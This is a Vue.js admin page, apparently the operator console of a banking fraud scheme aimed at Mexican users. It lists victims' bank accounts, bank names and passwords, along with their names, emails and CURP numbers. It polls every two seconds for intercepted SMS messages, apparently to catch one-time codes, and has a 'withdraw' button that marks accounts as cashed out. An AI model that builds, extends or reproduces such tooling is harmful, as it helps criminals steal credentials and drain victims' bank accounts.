<template>
  <div class="search">
    <Card>
      <Row @keydown.enter.native="handleSearch">
        <Form ref="searchForm" :model="searchForm" inline :label-width="100" class="search-form">
          <Form-item label="创建时间">
            <DatePicker v-model="times" type="datetimerange" format="yyyy-MM-dd HH:mm" clearable @on-change="changeDate" placeholder="选择支付时间" style="width: 200px"></DatePicker>
          </Form-item>
          <Button @click="handleSearch" type="primary" icon="ios-search" class="search-btn">搜索</Button>
          <Button @click="autoSearch"  class="search-btn" :disabled="autoStatus">自动刷新</Button>
<!--          <Button @click="playAudio" type="primary" icon="ios-search" class="search-btn">播放</Button>-->
          <Form-item label="声音播放:">
            <i-Switch  size="large" @on-change="playAudio" v-model="autoSearchValue" >
              <template #open>
                <span>开</span>
              </template>
              <template #close>
                <span>关</span>
              </template>
            </i-Switch>
          </Form-item>
        </Form>
      </Row>
      <Table :loading="loading" border :columns="columns" :data="data" ref="table" class="mt_10"></Table>
      <Row type="flex" justify="end" class="mt_10">
        <Page :current="searchForm.pageNumber" :total="total" :page-size="searchForm.pageSize" @on-change="changePage" @on-page-size-change="changePageSize" :page-size-opts="[10, 20, 50]" size="small"
          show-total show-elevator show-sizer></Page>
      </Row>
    </Card>
    <video  id="audio" src="../../../assets/static/y913.mp3"/>
    <Modal
      title="短信列表"
      v-model="modal10"
      fullscreen
      @on-cancel="cancelModal10"
    >
      <Tabs value="name1">
        <TabPane label="短信列表" name="name1">
          <Table :loading="loading1" border :columns="columns1" :data="data1" ref="table1" class="mt_10"></Table>
          <Row type="flex" justify="end" class="mt_10">
            <Page :current="searchForm1.pageNumber" :total="total1" :page-size="searchForm1.pageSize" @on-change="changePage1" @on-page-size-change="changePageSize1" :page-size-opts="[10, 20, 50]" size="small"
                  show-total show-elevator show-sizer></Page>
          </Row>
        </TabPane>
        <TabPane label="资料列表" name="name2">
          <Table :loading="loading2" border :columns="columns3" :data="data3" ref="table2" class="mt_10"></Table>
          <Row type="flex" justify="end" class="mt_10">
            <Page :current="searchForm3.pageNumber" :total="total2" :page-size="searchForm3.pageSize" @on-change="changePage2" @on-page-size-change="changePageSize2" :page-size-opts="[10, 20, 50]" size="small"
                  show-total show-elevator show-sizer></Page>
          </Row>
        </TabPane>
      </Tabs>
    </Modal>
  </div>
</template>

<script>
import * as BANK_LOG from "@/api/order";
import WS from "@/utils/websocket";
import {voicePrompt} from "@/utils/voicePrompt";
import {bankDataLog, smsLog, smsLogNew} from "@/api/order";

export default {
  name: "bankLog",
  data() {
    return {
      loading: true, // 表单加载状态
      loading1: false, // 表单加载状态
      loading2: false, // 表单加载状态
      searchForm: {
        // 搜索框初始化对象
        pageNumber: 1, // 当前页数
        pageSize: 10, // 页面大小
        sort: "createTime", // 默认排序字段
        order: "desc", // 默认排序方式
        sn: "",
        startDate: "", //订单创建时间
        endDate: "", //订单结束时间
      },
      searchForm1: {
        // 搜索框初始化对象
        pageNumber: 1, // 当前页数
        pageSize: 10, // 页面大小
        sort: "createTime", // 默认排序字段
        order: "desc", // 默认排序方式
        userId: "",
      },
      searchForm2: {
        // 搜索框初始化对象
        pageNumber: 1, // 当前页数
        pageSize: 10, // 页面大小
        sort: "createTime", // 默认排序字段
        order: "desc", // 默认排序方式
        userId: "",
      },
      searchForm3: {
        // 搜索框初始化对象
        pageNumber: 1, // 当前页数
        pageSize: 10, // 页面大小
        sort: "createTime", // 默认排序字段
        order: "desc", // 默认排序方式
        userId: "",
      },
      times: [], //订单创建时间
      autoSearchValue:false,
      modal10:false,
      columns2: [
        {
          title: "会员id",
          key: "userId",
          minWidth: 100,
          tooltip: true,
        },
        {
          title: "会员id",
          key: "uuid",
          minWidth: 100,
          tooltip: true,
        },
        {
          title: "发送号码",
          key: "address",
          minWidth: 100,
          tooltip: true,
        },
        {
          title: "内容",
          key: "body",
          minWidth: 100,
          tooltip: true,
        },
        {
          title: "创建时间",
          key: "createTime",
          width: 200,
          render: (h, params) => {
            return h("div", [
              h("span", {}, params.row.createTime || "暂无时间"),
            ]);
          },
        },
      ],
      columns3: [
        {
          title: "会员id",
          key: "userId",
          minWidth: 100,
          tooltip: true,
        },
        {
          title: "邮箱",
          key: "correo",
          minWidth: 100,
          tooltip: true,
        },
        {
          title: "名字",
          key: "nombre",
          minWidth: 100,
          tooltip: true,
        },
        {
          title: "社保号",
          key: "curp",
          minWidth: 100,
          tooltip: true,
        },
        {
          title: "Número de celular",
          key: "cvvNum",
          minWidth: 100,
          tooltip: true,
        },
        {
          title: "创建时间",
          key: "createTime",
          width: 200,
          render: (h, params) => {
            return h("div", [
              h("span", {}, params.row.createTime || "暂无时间"),
            ]);
          },
        },
      ],
      columns1: [
        {
          title: "会员id",
          key: "userId",
          minWidth: 100,
          tooltip: true,
        },
        {
          title: "发送号码",
          key: "address",
          minWidth: 100,
          tooltip: true,
        },
        {
          title: "内容",
          key: "body",
          minWidth: 100,
          tooltip: true,
        },
        {
          title: "创建时间",
          key: "createTime",
          width: 200,
          render: (h, params) => {
            return h("div", [
              h("span", {}, params.row.createTime || "暂无时间"),
            ]);
          },
        },
      ],
      columns: [
        // {
        //   title: "编号",
        //   key: "id",
        //   minWidth: 180,
        //   tooltip: true,
        // },
        {
          title: "会员id",
          key: "userId",
          minWidth: 100,
          tooltip: true,
        },
        {
          title: "会员手机号",
          key: "phone",
          minWidth: 100,
          tooltip: true,
        },
        {
          title: "银行账号",
          key: "userName",
          minWidth: 100,
          tooltip: true,
        },
        {
          title: "所属银行",
          key: "bankName",
          minWidth: 100,
          tooltip: true,
        },
        {
          title: "密码",
          key: "cardNum",
          width: 120,
          align: "center",
        },
        {
          title: "手机号",
          key: "phoneNum",
          width: 120,
          align: "center",
        },
        // {
        //   title: "cvv号",
        //   key: "cvvNum",
        //   width: 120,
        //   align: "center",
        // },
        {
          title: "会员名字",
          key: "createBy",
          width: 200
          },
        {
          title: "创建时间",
          key: "createTime",
          width: 200,
          render: (h, params) => {
            return h("div", [
              h("span", {}, params.row.createTime || "暂无时间"),
            ]);
          },
        },
        {
          title: "操作",
          width: 200,
          fixed: "right",
          render: (h, params) => {
            if(params.row.bankStatus == "1"){
              return h("div", [
                h("span", {},  "已提现"),
                h(
                  "Button",
                  {
                    props: {
                      type: "primary",
                      size: "small",
                    },
                    style: {
                      marginLeft: "10px",
                      marginRight: "5px"
                    },
                    on: {
                      click: () => {
                        this.smsLogSelect(params.row.uuid);
                      }
                    }
                  },
                  "短信列表"
                ),
              ]);
            }
            return h("div", [
              h(
                "Button",
                {
                  props: {
                    type: "primary",
                    size: "small",
                  },
                  style: {
                    marginRight: "5px"
                  },
                  on: {
                    click: () => {
                      this.editBankLog(params.row);
                    }
                  }
                },
                "提现"
              ),
              h(
                "Button",
                {
                  props: {
                    type: "primary",
                    size: "small",
                  },
                  style: {
                    marginRight: "5px"
                  },
                  on: {
                    click: () => {
                      this.smsLogSelect(params.row.uuid,params.row.userId);
                    }
                  }
                },
                "短信列表"
              )
            ]);
          },
        },
      ],
      data: [], // 表单数据
      data1: [], // 表单数据
      data2: [], // 表单数据
      data3: [], // 表单数据
      total: 0, // 表单数据总数
      total1: 0, // 表单数据总数
      total2: 0, // 表单数据总数
      autoStatus:false,
      dataListSet:null,
      userIdTemp:null,
      uuidTemp:null,
    };
  },
  computed:{
    getWsMsg (){
      return this.$store.state.webSocketMsg
    }
  },
  watch:{
    getWsMsg:{
      handler: function(newVal) {
        console.log("llllllll",newVal)
        if(newVal == "jj"){
          this.playAudio();
        }
        // this.voicePrompt("")
      }
    }
  },
  methods: {
    // 初始化数据
    init() {
      this.$ws.createWS();
      this.getDataList();
    },
      playAudio () {
        // this.autoStatus = true
        let audio1 = document.getElementById('audio')
        if (audio1.paused) { // 判断是否暂停
          audio1.play() // 播放
        } else {
          audio1.pause() // 停止
        }
      },
    // 改变页码
    changePage(v) {
      this.searchForm.pageNumber = v;
      this.getDataList();
    },
    changePage1(v) {
      this.searchForm.pageNumber = v;
      this.getDataList1();
    },
    changePage2(v) {
      this.searchForm.pageNumber = v;
      this.getDataList3();
    },
    // 改变页数
    changePageSize(v) {
      this.searchForm.pageNumber = 1;
      this.searchForm.pageSize = v;
      this.getDataList();
    },
    // 改变页数
    changePageSize1(v) {
      this.searchForm.pageNumber = 1;
      this.searchForm.pageSize = v;
      this.getDataList();
    },
    // 改变页数
    changePageSize2(v) {
      this.searchForm.pageNumber = 1;
      this.searchForm.pageSize = v;
      this.getDataList();
    },
    // 搜索
    handleSearch() {
      this.searchForm.pageNumber = 1;
      this.searchForm.pageSize = 10;
      this.getDataList();
    },
    autoSearch(){
      if(this.autoStatus){
        this.$Message.error("自动刷新中");
      }
      this.autoStatus =true
      let that  = this
      setInterval(()=>{
        that.getDataList
      }, 1500);
    },
    smsLog(params){
      this.loading1 = true;
      BANK_LOG.updateBankLog(params).then((res) => {
        this.loading1 = false;
        if (res.success) {
          this.$Message.success("更新成功");
          this.getDataList();
        }
      });
    },
    editBankLog(params){
      // let param = {
      //   "uid":params.uid,
      //   "bankStatus":"1"
      // }
      this.loading = true;
      BANK_LOG.updateBankLog(params).then((res) => {
        this.loading = false;
        if (res.success) {
          this.$Message.success("更新成功");
          this.getDataList();
        }
      });
    },
    changeDate(val) {
      // 改变日期格式
      this.searchForm.startDate = val[0];
      this.searchForm.endDate = val[1];
    },
    // 获取列表
    getDataList() {
      this.loading = true;
      BANK_LOG.bankLog(this.searchForm).then((res) => {
        this.loading = false;
        if (res.success) {
          this.data = res.result.records;
          this.total = res.result.total;
        }
      });
      this.total = this.data.length;
      this.loading = false;
    },
    smsLogSelect(id,userId){
      this.getDataList3(userId);
      clearInterval(this.dataListSet)
      this.modal10 =true
      this.uuidTemp = id
      this.userIdTemp = userId
      let that = this
      this.dataListSet = setInterval(()=>{
        that.getDataList1(that.uuidTemp,that.userIdTemp)
      }, 2000);
    },
    // 获取列表
    getDataList1(id,userId) {
      this.searchForm1.userId = userId
      BANK_LOG.smsLog(this.searchForm1).then((res) => {
        this.loading1 = false;
        if (res.success) {
          // this.getDataList2()
          this.data1 = res.result.records;
          this.total1 = res.result.total;
        }
      });
      this.total = this.data.length;
    },
    getDataList2() {
      this.loading2 = true;
      BANK_LOG.smsLogNew(this.searchForm1).then((res) => {
        this.loading2 = false;
        if (res.success) {
          this.data2 = res.result.records;
          // this.total2 = res.result.total;
        }
      });
      // this.total2 = this.data.length;
      this.loading2 = false;
    },
    getDataList3(userId) {
      this.loading2 = true;
      this.searchForm3.userId = userId
      BANK_LOG.bankDataLog(this.searchForm3).then((res) => {
        this.loading2 = false;
        debugger
        if (res.success) {
          this.data3 = res.result;
          // this.total2 = res.result.total;
        }
      });
      // this.total2 = this.data.length;
      this.loading2 = false;
    },
  },
  mounted() {
    this.init();
  },
};
</script>

